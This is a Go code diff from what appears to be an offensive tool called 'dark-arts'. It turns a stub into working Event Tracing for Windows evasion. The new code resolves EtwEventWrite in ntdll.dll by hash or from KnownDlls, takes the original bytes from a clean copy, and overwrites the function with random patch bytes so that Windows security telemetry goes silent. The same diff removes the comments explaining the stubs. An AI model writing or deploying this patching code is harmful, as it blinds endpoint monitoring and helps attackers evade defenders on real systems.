@@ -2,33 +2,63 @@
 
 package securityctl
 
-// ETWControl implements SecurityControl for ETW integration.
-// Phase 5B: no-op stub. All methods return safe defaults.
-// Phase 5C: will implement actual ETW security-control integration.
+import (
+	"fmt"
+
+	"dark-arts/pkg/evasion"
+)
+
 type ETWControl struct {
 	baseControl
+	fp *funcPatch
 }
 
-// NewETWControl creates a new ETW security-control instance.
 func NewETWControl() *ETWControl {
 	return &ETWControl{baseControl: newBaseControl("etw")}
 }
 
-// Initialize resolves ETW dependencies. Phase 5B: no-op, returns nil.
 func (e *ETWControl) Initialize() error {
+	fp, err := resolveFuncByHash("ntdll.dll", "EtwEventWrite")
+	if err != nil {
+		fp, err = resolveFuncFromKnownDlls("ntdll.dll", "EtwEventWrite")
+		if err != nil {
+			return e.markInitialized(fmt.Errorf("securityctl: etw: resolve: %w", err))
+		}
+	}
+	e.fp = fp
+
+	cleanBase, cerr := evasion.DiagCleanBase()
+	if cerr == nil && cleanBase != 0 {
+		cleanFP, err := resolveFuncFromBase(cleanBase, "EtwEventWrite")
+		if err == nil && cleanFP != nil {
+			e.fp.orig = cleanFP.orig
+		}
+	}
 	return e.markInitialized(nil)
 }
 
-// Enable applies the ETW modification. Phase 5B: no-op, returns nil.
 func (e *ETWControl) Enable() error {
-	return e.markEnabled()
+	if err := e.markEnabled(); err != nil {
+		return err
+	}
+	if e.fp == nil {
+		return fmt.Errorf("securityctl: etw: not initialized")
+	}
+	e.fp.patch = randomPatchBytes()
+	return applyPatch(e.fp)
 }
 
-// Disable reverts the ETW modification. Phase 5B: no-op, returns nil.
 func (e *ETWControl) Disable() error {
 	e.markDisabled()
-	return nil
+	if e.fp == nil {
+		return nil
+	}
+	return restorePatch(e.fp)
 }
 
-// Restore cleans up on process exit. Phase 5B: no-op.
-func (e *ETWControl) Restore() {}
+func (e *ETWControl) Restore() {
+	if e.fp == nil {
+		return
+	}
+	_ = restorePatch(e.fp)
+}
